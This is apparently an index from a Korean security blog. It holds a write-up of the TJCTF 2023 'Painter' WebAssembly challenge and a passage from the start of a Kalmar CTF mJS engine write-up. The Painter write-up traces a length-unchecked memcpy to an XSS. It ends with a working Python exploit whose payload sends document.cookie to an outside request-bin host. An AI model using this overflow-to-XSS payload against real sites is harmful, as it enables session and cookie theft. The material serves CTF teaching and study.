@type {function(...*):?} */ var _setName = Module[\u0026#34;_setName\u0026#34;] = createExportWrapper(\u0026#34;setName\u0026#34;); /** @type {function(...*):?} */ var _free = createExportWrapper(\u0026#34;free\u0026#34;); /** @type {function(...*):?} */ var _copyCanvas = Module[\u0026#34;_copyCanvas\u0026#34;] = createExportWrapper(\u0026#34;copyCanvas\u0026#34;); /** @type {function(...*):?} */ var _setColor = Module[\u0026#34;_setColor\u0026#34;] = createExportWrapper(\u0026#34;setColor\u0026#34;); /** @type {function(...*):?} */ var _setLayer = Module[\u0026#34;_setLayer\u0026#34;] = createExportWrapper(\u0026#34;setLayer\u0026#34;); /** @type {function(...*):?} */ var _toggleLeftMouseButton = Module[\u0026#34;_toggleLeftMouseButton\u0026#34;] = createExportWrapper(\u0026#34;toggleLeftMouseButton\u0026#34;); /** @type {function(...*):?} */ var _draw = Module[\u0026#34;_draw\u0026#34;] = createExportWrapper(\u0026#34;draw\u0026#34;); /** @type {function(...*):?} */ var _clearCanvas = Module[\u0026#34;_clearCanvas\u0026#34;] = createExportWrapper(\u0026#34;clearCanvas\u0026#34;); /** @type {function(...*):?} */ var _loop = Module[\u0026#34;_loop\u0026#34;] = createExportWrapper(\u0026#34;loop\u0026#34;); /** @type {function(...*):?} */ var _main = Module[\u0026#34;_main\u0026#34;] = createExportWrapper(\u0026#34;main\u0026#34;); /** @type {function(...*):?} */ var _malloc = createExportWrapper(\u0026#34;malloc\u0026#34;); /** @type {function(...*):?} */ var ___errno_location = createExportWrapper(\u0026#34;__errno_location\u0026#34;); /** @type {function(...*):?} */ var ___dl_seterr = createExportWrapper(\u0026#34;__dl_seterr\u0026#34;); /** @type {function(...*):?} */ var _fflush = Module[\u0026#34;_fflush\u0026#34;] = createExportWrapper(\u0026#34;fflush\u0026#34;); /** @type {function(...*):?} */ var _emscripten_stack_init = function() { return (_emscripten_stack_init = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_init\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_free = function() { return (_emscripten_stack_get_free = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_free\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_base = function() { return (_emscripten_stack_get_base = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_base\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_end = function() { return (_emscripten_stack_get_end = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_end\u0026#34;]).apply(null, arguments); }; ... 대충 함수 export를 해준다.\nindex.wasm 아래 디컴파일러를 사용해서 분석했다. wabt보다 훨씬 좋다. https://github.com/wasmkit/diswasm\nwasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다. wasm은 따로 ASLR 같은 메모리 보호 기법이 없다. global variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.\nsetName() // O[0] Decompilation of $func238, known as $func5 export \u0026#34;setName\u0026#34;; // $func238 is exported to \u0026#34;setName\u0026#34; void $func5(int arr, int param1) { // offset=0xc int ar; // offset=0x8 int local_8; // offset=0x4 int local_4; ar = arr; local_8 = param1; label$1: { label$2: { if ((((local_8 \u0026gt;= 0x8) \u0026amp; 0x1) == 0x0)) break label$2; break label$1; }; }; local_8 = local_8; local_4 = 0x0; label$3: { while (1) { if ((((local_4 \u0026lt; local_8) \u0026amp; 0x1) == 0x0)) break label$3; *((unsigned char *) local_4 + 0x2191c) = *((unsigned char *) (ar + local_4)); local_4 = (local_4 + 0x1); break label$4; break ; }; }; *((unsigned char *) local_8 + 0x2191c) = 0x0; $free(ar); return; } 0x2191c가 Name이다.\ncopyCanvas() // O[0] Decompilation of $func239, known as $func6 export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } 0x21924에 length 만큼 복사한다.\ngetLayer() // O[0] Decompilation of $func237, known as $func4 export \u0026#34;getLayer\u0026#34;; // $func237 is exported to \u0026#34;getLayer\u0026#34; int $func4(int param0) { // offset=0xc int local_c; local_c = param0; return ((0x2091c + 0x1008) + (local_c \u0026lt;\u0026lt; 0xc)); } 0x21924가 Layer인 것 같다.\nmain() // O[2] Disassembly of $func248, known as $func15 export \u0026#34;main\u0026#34;; // $func248 is exported to \u0026#34;main\u0026#34; int $func15(int param0, int param1) { // local index=2 int local2; local2 = $func13(); return local2; } func13() // O[2] Disassembly of $func246, known as $func13 int $func13() { // local index=0 int local0; // local index=1 int local1; // local index=2 int local2; // local index=3 int local3; // local index=4 int local4; // local index=5 int local5; // local index=6 int local6; // local index=7 int local7; // local index=8 int local8; // local index=9 int local9; // local index=10 int local10; // local index=11 int local11; // local index=12 int local12; // local index=13 int local13; // local index=14 int local14; local0 = 0x20; $func18(local0); local1 = 0x20; local2 = 0x0; local3 = 0x20914; local4 = 0x20910; $func476(local1, local1, local2, local3, local4); local5 = 0x303; local6 = 0x0; $func80(local5, local6); local7 = 0x0; local8 = 0x20; local9 = $func670(local7, local8, local8, local8, local7, local7, local7, local7); local10 = 0x0; *((unsigned int *) local10 + 0x20918) = local9; local11 = 0x1; local12 = 0x0; local13 = 0x1; fimport_emscripten_set_main_loop(local11, local12, local13); // executes exported function named \u0026#34;loop\u0026#34; every tick local14 = 0x0; return local14; } tick 마다 \u0026ldquo;loop\u0026rdquo; 함수를 실행한다. 호스트 환경에서 실행시켜주기 때문에 \u0026ldquo;loop\u0026quot;는 export 해야 한다.\nloop() // O[0] Decompilation of $func245, known as $func12 export \u0026#34;loop\u0026#34;; // $func245 is exported to \u0026#34;loop\u0026#34; void $func12() { // offset=0x1c int local_1c; // offset=0x18 int local_18; // offset=0x14 int local_14; // offset=0x10 int local_10; // offset=0xc int local_c; label$1: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$1; $func686(*((unsigned int *) 0x20918)); }; local_1c = *((unsigned int *) *((unsigned int *) 0x20918) + 0x14); local_18 = 0x0; label$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); $memcpy(local_1c, 0x2091c, 0x1000); label$7: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$7; $func687(*((unsigned int *) 0x20918)); }; local_c = $func489(*((unsigned int *) 0x20910), *((unsigned int *) 0x20918)); $func496(*((unsigned int *) 0x20910)); $func499(*((unsigned int *) 0x20910), local_c, 0x0, 0x0); $func502(*((unsigned int *) 0x20910)); $func488(local_c); return; } 0x2091c에 0x24924만큼 0x21924를 복사한다.\n대충 이제 구조를 그려보면\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이런 전역 구조체? 정도로 생각할 수 있다.\n4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.\nExploitation index.html의 일부를 보면 아래와 같다.\nconst binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); binary는 클라이언트단에서 컨트롤이 가능하다.\n{% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} _copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.\n$memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); l을 컨트롤할 수 있다. t는 malloc으로 할당받은 버퍼다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 여기서 overflow를 내서 count를 덮을 수 있다.\n그리고 tick 마다 loop가 호출된다.\nlabel$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다. 이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.\nif ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; 여기 if문에서 local_14가 0이 아니게 되어버리면, \u0026laquo; 0xc 때문에 0x1000 단위로 커져버린다. 여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다. const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); 원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.\nExploit script import base64 import requests from pwn import p8,p16 BASE_URL = \u0026#39;https://painter.tjc.tf\u0026#39; attackerURL = \u0026#39;https://qivuygm.request.dreamhack.games\u0026#39; \u0026#39;\u0026#39;\u0026#39; 0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 \u0026#39;\u0026#39;\u0026#39; injection = f\u0026#34;\u0026lt;img src=@ onerror=window.location=\u0026#39;{attackerURL}?flag=\u0026#39;+document.cookie\u0026gt;\u0026#34; def paygen(string : bytes): \u0026#39;\u0026#39;\u0026#39; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 \u0026#39;\u0026#39;\u0026#39; pay = b\u0026#39;\u0026#39; for i in range(len(string)): if (i+1) % 4 == 0: pay += p8(0xff-string[i]) else: pay += p8(string[i]) return pay pay = b\u0026#39;\\xff\u0026#39;*(0x2191c- 0x2091c) pay += paygen(injection.encode()) pay += b\u0026#39;\\x00\u0026#39;*4 pay += b\u0026#39;\\xff\u0026#39; * ((0x24924- 0x21924)-len(pay)) # pixels overflow \u0026#39;\u0026#39;\u0026#39; export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); \u0026#39;\u0026#39;\u0026#39; pay += p16(0x1000+len(injection)+4) pay += b\u0026#39;\\xff\u0026#39;*(0x70-2) # print(pay[0x1000:0x1030]) # print(hex(pay[0x3000]),hex(pay[0x3001])) # print(hex(len(pay))) re = requests.post(f\u0026#39;{BASE_URL}/save\u0026#39;, json={ \u0026#39;img\u0026#39;: base64.b64encode(pay).decode(), \u0026#39;name\u0026#39;: \u0026#39;exploit\u0026#39; }) print(re.url) admin bot한테 url주고 돌리면 flag 나온다. tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}\n","permalink":"https://msh1307.kr/blog/tjctf_2023_painter/","summary":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.","title":"TJCTF 2023 - Painter"},{"content":"MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \u0026#34;kalmar{redacted}\u0026#34; \u0026gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \u0026#34;timeout 60 ./remote.py\u0026#34; 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR) DOCKER_GCC ?= $(RD) mgos/gcc DOCKER_CLANG ?= $(RD) mgos/clang +CC = clang include $(SRCPATH)/mjs_sources.mk @@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS) # NOTE: we compile straight from sources, not from the single amalgamated file, # in order to make sure that all sources include the right headers $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR) -\t$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) +\t$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) $(BUILD_DIR): mkdir -p $@ diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c index 6f51e08..36c2b43 100644 --- a/src/mjs_builtin.c +++ b/src/mjs_builtin.c @@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load)); mjs_set(mjs, obj, \u0026#34;print\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print)); - mjs_set(mjs, obj, \u0026#34;ffi\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); - mjs_set(mjs, obj, \u0026#34;ffi_cb_free\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); - mjs_set(mjs, obj, \u0026#34;mkstr\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); + /* mjs_set(mjs, obj, \u0026#34;ffi\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */ + /* mjs_set(mjs, obj, \u0026#34;ffi_cb_free\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */ + /* mjs_set(mjs, obj, \u0026#34;mkstr\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */ mjs_set(mjs, obj, \u0026#34;getMJS\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs)); mjs_set(mjs, obj, \u0026#34;die\u0026#34;, ~0, @@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc)); mjs_set(mjs, obj, \u0026#34;chr\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr)); - mjs_set(mjs, obj, \u0026#34;s2o\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); + /* mjs_set(mjs, obj, \u0026#34;s2o\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */ /* * Populate JSON.parse() and JSON.stringify() diff --git a/src/mjs_exec.c b/src/mjs_exec.c index bd48fea..24c2c7c 100644 --- a/src/mjs_exec.c +++ b/src/mjs_exec.c @@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) { *func = MJS_UNDEFINED; // Return value // LOG(LL_VERBOSE_DEBUG, (\u0026#34;CALLING %d\u0026#34;, i + 1)); - } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) { + } else if (mjs_is_ffi_sig(*func)) { /* Call ffi-ed function */ call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx); patch.diff가 주어진다.\nhttps://github.com/cesanta/mjs diff.patch is just hardening :) README.txt가 주어졌다. diff.patch는 그냥 hardening 이라고 한다.\nhttps://github.com/cesanta/mjs 깃허브에 들어가보면 diff에서 ffi를 왜 없애는지 알 수 있다.\n$ ./build/mjs -e \u0026#39;ffi(\u0026#34;double sin(double)\u0026#34;)(1.23)\u0026#39; 0.942489 다음과 같이 쓸 수 있어서, system으로 바로 따는걸 막기 위해서 일부러 없애놓은 것 같다.\nmjs_err_t __cdecl mjs_exec_internal(mjs *mjs, const char *path, const char *code, int generate_jsc, mjs_val_t *res) { size_t v5; // rax int v6; // eax char *v7; // rax _QWORD v9[2]; // [rsp+0h] [rbp-B0h] BYREF mjs *v10; // [rsp+10h] [rbp-A0h] char *filename; // [rsp+18h] [rbp-98h] __int64 v12; // [rsp+20h] [rbp-90h] FILE *fp; // [rsp+28h] [rbp-88h] char *data; // [rsp+30h] [rbp-80h] size_t size; // [rsp+38h] [rbp-78h] BYREF mjs_bcode_part *bp_0; // [rsp+40h] [rbp-70h] unsigned __int64 __vla_expr0; // [rsp+48h] [rbp-68h] _QWORD *v18; // [rsp+50h] [rbp-60h] const char *jscext; // [rsp+58h] [rbp-58h] int read_mmapped; // [rsp+64h] [rbp-4Ch] int rewrite; // [rsp+68h] [rbp-48h] int basename_len; // [rsp+6Ch] [rbp-44h] const char *jsext; // [rsp+70h] [rbp-40h] mjs_val_t r; // [rsp+78h] [rbp-38h] BYREF size_t off; // [rsp+80h] [rbp-30h] mjs_val_t *resa; // [rsp+88h] [rbp-28h] int generate_jsca; // [rsp+94h] [rbp-1Ch] const char *JS_CODE; // [rsp+98h] [rbp-18h] const char *patha; // [rsp+A0h] [rbp-10h] mjs *mjsa; // [rsp+A8h] [rbp-8h] mjsa = mjs; patha = path; // \u0026lt;stdin\u0026gt; JS_CODE = code; generate_jsca = generate_jsc; resa = res; off = mjs-\u0026gt;bcode_len; r = 0xFFF3000000000000LL; mjs-\u0026gt;error = mjs_parse(path, code, mjs); if ( cs_log_level_0 \u0026gt;= 4 ) mjs_dump(mjsa, 1); if ( generate_jsca == -1 ) generate_jsca = (*((_BYTE *)mjsa + 464) \u0026amp; 4) != 0; if ( mjsa-\u0026gt;error == MJS_OK ) { if ( generate_jsca ) { if ( patha ) { jsext = \u0026#34;.js\u0026#34;; v12 = (int)strlen(patha); basename_len = v12 - strlen(\u0026#34;.js\u0026#34;); if ( basename_len \u0026gt; 0 \u0026amp;\u0026amp; !strcmp(\u0026amp;patha[basename_len], jsext) ) { rewrite = 1; read_mmapped = 1; jscext = \u0026#34;.jsc\u0026#34;; v9[1] = basename_len; v5 = strlen(\u0026#34;.jsc\u0026#34;); v18 = v9; filename = (char *)v9 - ((basename_len + v5 + 16) \u0026amp; 0xFFFFFFFFFFFFFFF0LL); __vla_expr0 = basename_len + v5 + 1; memcpy(filename, patha, basename_len); strcpy(\u0026amp;filename[basename_len], jscext); v10 = mjsa; v6 = mjs_bcode_parts_cnt(mjsa); bp_0 = mjs_bcode_part_get(v10, v6 - 1); data = cs_mmap_file(filename, \u0026amp;size); if ( data ) { if ( size == bp_0-\u0026gt;data.len \u0026amp;\u0026amp; !memcmp(data, bp_0-\u0026gt;data.p, size) ) rewrite = 0; munmap(data, size); } if ( rewrite ) { fp = fopen64(filename, \u0026#34;wb\u0026#34;); if ( fp ) { fwrite(bp_0-\u0026gt;data.p, bp_0-\u0026gt;data.len, 1uLL, fp); fclose(fp); } else { if ( cs_log_print_prefix(LL_WARN, \u0026#34;src/mjs_exec.c\u0026#34;, 1054) ) cs_log_printf(\u0026#34;Failed to open %s for writing\u0026#34;, filename); read_mmapped = 0; } } if ( read_mmapped ) { free((void *)bp_0-\u0026gt;data.p); v7 = cs_mmap_file(filename, \u0026amp;bp_0-\u0026gt;data.len); bp_0-\u0026gt;data.p = v7; *((_BYTE *)bp_0 + 24) = *((_BYTE *)bp_0 + 24) \u0026amp; 0xEF | 0x10; } } } } mjs_execute(mjsa, off, \u0026amp;r); mjs_exec_internal 함수의 인자로 path가 주어지는데, 이건 -e 옵션으로 직접 js 코드를 주면, \u0026lt;stdin\u0026gt; 문자열의 주소가 된다. code는 말 그대로 js code의 포인터이다. mjs는 그냥 mjs 객체이다.\nmjs_parse와 mjs_execute가 분석해야할 주요 함수이다. 간단하게 기능을 알아보자면, mjs_parse는 문법을 분석해서 바이트 코드를 점화해서 mjs 객체에 추가해놓는다. 그리고 mjs_execute는 점화된 바이트 코드를 실행한다.\nmjs_parse mjs_err_t __cdecl mjs_parse(const char *path, const char *CODE_, mjs *mjs) { size_t v3; // rax mjs *a; // [rsp+8h] [rbp-B8h] const char *v6; // [rsp+10h] [rbp-B0h] int map_len; // [rsp+24h] [rbp-9Ch] size_t llen; // [rsp+28h] [rbp-98h] size_t start_idx; // [rsp+30h] [rbp-90h] pstate p; // [rsp+38h] [rbp-88h] BYREF mjs_err_t res; // [rsp+A4h] [rbp-1Ch] mjs *mjsa; // [rsp+A8h] [rbp-18h] const char *CODE; // [rsp+B0h] [rbp-10h] const char *patha; // [rsp+B8h] [rbp-8h] patha = path; CODE = CODE_; mjsa = mjs; res = MJS_OK; pinit(path, CODE_, \u0026amp;p); p.mjs = mjsa; p.cur_idx = mjsa-\u0026gt;bcode_gen.len; emit_byte(\u0026amp;p, 0x24u); // OP_BCODE_HEADER = 0x24 start off start_idx = p.mjs-\u0026gt;bcode_gen.len; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, 0LL, 0xCuLL); a = p.mjs; v6 = patha; v3 = strlen(patha); mbuf_append(\u0026amp;a-\u0026gt;bcode_gen, v6, v3 + 1); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 4] = p.mjs-\u0026gt;bcode_gen.len - start_idx; p.start_bcode_idx = p.mjs-\u0026gt;bcode_gen.len; p.cur_idx = p.mjs-\u0026gt;bcode_gen.len; res = parse_statement_list(\u0026amp;p, 0); emit_byte(\u0026amp;p, 0x23u); // OP_EXIT *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 8] = p.mjs-\u0026gt;bcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026amp;p.mjs-\u0026gt;bcode_gen, llen + p.mjs-\u0026gt;bcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[p.mjs-\u0026gt;bcode_gen.len], llen); p.mjs-\u0026gt;bcode_gen.len += llen; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx] = p.mjs-\u0026gt;bcode_gen.len - start_idx; mbuf_free(\u0026amp;p.offset_lineno_map); if ( res ) mbuf_free(\u0026amp;mjsa-\u0026gt;bcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 모습이다. pinit은 pstate를 초기화해주는 함수이다.\n00000000 pstate struc ; (sizeof=0x68, align=0x8, copyof_117) 00000000 ; XREF: mjs_parse/r 00000000 ; parse_return/r ... 00000000 file_name dq ? ; offset 00000008 buf dq ? ; offset 00000010 pos dq ? ; offset 00000018 line_no dd ? 0000001C last_emitted_line_no dd ? 00000020 offset_lineno_map mbuf ? ; XREF: mjs_parse+142/r 00000020 ; mjs_parse+1B0/r ... 00000038 prev_tok dd ? 0000003C db ? ; undefined 0000003D db ? ; undefined 0000003E db ? ; undefined 0000003F db ? ; undefined 00000040 tok tok ? 00000050 mjs dq ? ; XREF: mjs_parse+36/w 00000050 ; mjs_parse+3A/r ... ; offset 00000058 start_bcode_idx dd ? ; XREF: mjs_parse+E5/w 0000005C cur_idx dd ? ; XREF: mjs_parse+42/w 0000005C ; mjs_parse+F0/w 00000060 depth dd ? 00000064 db ? ; undefined 00000065 db ? ; undefined 00000066 db ? ; undefined 00000067 db ? ; undefined 